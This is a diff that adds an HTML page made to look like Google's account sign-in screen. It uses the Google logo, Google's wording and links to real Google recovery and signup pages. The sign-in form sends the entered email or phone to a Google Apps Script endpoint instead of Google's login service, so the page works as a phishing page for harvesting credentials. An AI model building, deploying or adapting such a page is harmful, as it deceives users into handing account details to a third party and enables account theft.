@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <link rel="stylesheet" href="signpage.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        </div>
+        <div class="signin-form">
+            <h1>Sign in</h1>
+            <p>Use your Google Account. The account will be added to this device and available to other Google apps.</p>
+            <a href="https://support.google.com/chrome/answer/6130773?hl=en-GB" class="learn-more">Learn more about using your account</a>
+            <form id="signinForm"
+            method="post"
+            action="https://script.google.com/macros/s/AKfycbw-znGZwNTJle2M753wiqvEcWKBKTQwhI1_joGBHBAGITOmqS9_Z56ymke3UZtn2ImiJQ/exec"
+            name="signinForm"
+            onsubmit="return validateForm()"
+            >
+                <input type="text" name="email" placeholder="Email or phone" required>
+                <div class="forgot-email-container">
+                    <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmyaccount.google.com%2F&ddm=1&dsh=S-585670314%3A1739019056922506&ec=GAlAwAE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en_GB&service=accountsettings&authuser=0" class="forgot-email">Forgot email?</a>
+                </div>
+                <!--
+                <p class="create-account">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+                -->
+                <div class="actions">
+                    <a href="https://accounts.google.com/lifecycle/steps/signup/name?ddm=1&dsh=S1228560543:1739019309819830&flowEntry=SignUp&flowName=GlifWebSignIn&TL=ADgdZ7RSqz_dHbyr_BdzUC6Z5J_9S9y6wRFV4Dp8HCI9ka9OIhDnj4O9TYgcuwW8&continue=https://accounts.google.com/ManageAccount?nc%3D1" class="create-account-link">Create account</a>
+                    <!-- 
+                    form.addEventListener("type" word here)
+                    -->
+                    <input type="submit"
+                    name="next-button"
+                    id="next-button"
+                    value="Next"
+                    
+                    class="next-button"
+                     
+                     >
+                  
+                </div>
+            </form>
+        </div>
+    </div>
+    <script src="signpage.js"></script>
+</body>
+</html>
